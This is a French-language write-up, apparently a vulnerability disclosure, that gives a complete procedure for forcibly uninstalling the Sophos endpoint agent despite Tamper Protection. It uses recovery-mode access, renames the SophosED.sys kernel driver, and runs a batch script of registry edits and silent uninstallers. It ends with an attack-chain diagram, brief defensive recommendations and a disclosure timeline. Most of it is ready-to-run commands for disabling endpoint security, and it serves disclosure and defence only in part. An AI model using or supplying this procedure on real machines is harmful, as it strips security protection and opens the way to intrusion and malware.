Kill Sophos / Bitdefender
📋 Procédure de désinstallation forcée

    Découverte : 01/01/2026
    Statut : Éditeurs informés (Responsible Disclosure)
    Type : Contournement de protection (Tamper Protection bypass)

🔍 Contexte

Cette procédure permet de désinstaller complètement l'agent Sophos (et potentiellement Bitdefender) d'une machine Windows, même lorsque la Tamper Protection est active.

La méthode repose sur un contournement physique (mode de récupération) et des modifications du registre pour désactiver les mécanismes de protection avant d'exécuter les désinstalleurs officiels.
⚠️ Avertissement

    Cette procédure est documentée à des fins de recherche uniquement.
    Toute utilisation non autorisée est illégale. Les éditeurs ont été informés de cette vulnérabilité.

📝 Procédure complète
Étape 1 : Accéder au mode de récupération

    Ouvrir les Paramètres Windows

    Naviguer vers Système → Récupération → Démarrage avancé

    Redémarrer le poste en mode avancé

Étape 2 : Ouvrir l'invite de commandes

    Sélectionner Dépannage

    Aller dans Options avancées → Invite de commandes

Étape 3 : Identifier le lecteur système
cmd

diskpart
list volume
exit

    Notez la lettre du lecteur système (généralement C:)

Étape 4 : Renommer le driver Sophos
cmd

C:
cd Windows\System32\drivers
ren SophosED.sys SophosED.sys.old

    Le fichier SophosED.sys est le driver noyau de Sophos Endpoint Defense.
    En le renommant, il ne sera pas chargé au prochain démarrage.

Étape 5 : Exécuter le script de désinstallation

    Taper exit pour fermer l'invite de commandes

    Sélectionner Continuer vers Windows

    Ouvrir une invite de commandes en administrateur

    Naviguer vers le dossier contenant le script :

cmd

cd C:\Users\rems.w11.test3\Desktop
.\UninstallSophos.bat

Contenu du script :
batch

:: Désactiver le service MCS Agent
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sophos MCS Agent" /v Start /t REG_DWORD /d 4 /f

:: Désactiver Tamper Protection
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Services\hmpalert" /v Protected /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Services\Sophos System Protection Service" /v Protected /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Services\sophosztnatap" /v Protected /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Config" /v SEDEnabled /t REG_DWORD /d 0 /f

:: Lancement des désinstalleurs officiels
"C:\Program Files\Sophos\Sophos Endpoint Agent\SophosUninstall.exe" -y
"C:\Program Files\Sophos\Endpoint Defense\SEDuninstall.exe" -y
"C:\Program Files\Sophos\Sophos ML Engine\SophosSMEUninstall.exe" -y
"C:\Program Files\Sophos\Sophos Standalone Engine\SophosSSEUninstall.exe" -y
"C:\Program Files\Sophos\AutoUpdate\SophosAutoUpdateUninstall.exe" -y
"C:\Program Files\Sophos\Sophos AMSI Protection\SophosAmsiUninstall.exe" -y
"C:\Program Files\Sophos\Sophos UI\SophosUIUninstall.exe" -y
"C:\Program Files\Sophos\Endpoint Firewall\SophosEfwUninstall.exe" -y
"C:\Program Files\Sophos\Sophos Network Threat Protection\SophosNtpUninstall.exe" -y
"C:\Program Files\Sophos\Endpoint Self Help\SophosESHUninstall.exe" -y
"C:\Program Files\Sophos\Sophos Diagnostic Utility\SophosSduUninstall.exe" -y
"C:\Program Files (x86)\HitmanPro.Alert\SophosHMPAUninstaller.exe" -y
"C:\Program Files\Sophos\Sophos File Scanner\SophosFSUninstall.exe" -y

    Note : Le script est exécuté deux fois pour s'assurer que tous les composants sont désinstallés.

Étape 6 : Finalisation
cmd

shutdown /r /t 0

🔬 Découverte complémentaire

Un outil légitime de WatchGuard (EndpointAgentTool.exe) peut également être utilisé pour désinstaller l'agent Sophos :

    "Découverte d'un outil capable de supprimer l'agent, phase de test 01/01/2026"

Source : WatchGuard Documentation

    Taux de réussite : 99%

📊 Chaîne d'attaque
text

Accès Admin
    ↓
Démarrage en mode récupération
    ↓
Renommage du driver (.sys → .old)
    ↓
Redémarrage normal
    ↓
Désactivation Tamper Protection (registre)
    ↓
Lancement désinstalleurs officiels (-y)
    ↓
Second passage du script
    ↓
Redémarrage final
    ↓
✅ Désinstallation réussie

🛡️ Recommandations de sécurité
Mesure	Description
Moindre privilège	Restreindre les droits administrateur
BitLocker / Secure Boot	Empêcher l'accès au mode récupération
Surveillance registre	Alerter sur modifications de TamperProtection
Surveillance fichiers	Alerter sur renommage de *.sys dans drivers\
EDR	Détection comportementale des chaînes d'actions suspectes
📅 Timeline

    01/01/2026 : Découverte de la procédure

    01/01/2026 : Test de l'outil WatchGuard

    01/01/2026 : Information des éditeurs concernés (Responsible Disclosure)

📚 Références

    WatchGuard - Endpoint Agent Tool

    Microsoft - Options de récupération Windows

⚖️ Responsible Disclosure

Conformément aux pratiques éthiques de cybersécurité, les éditeurs concernés (Sophos, Bitdefender, WatchGuard) ont été informés de cette vulnérabilité afin qu'ils puissent prendre les mesures correctives appropriées.
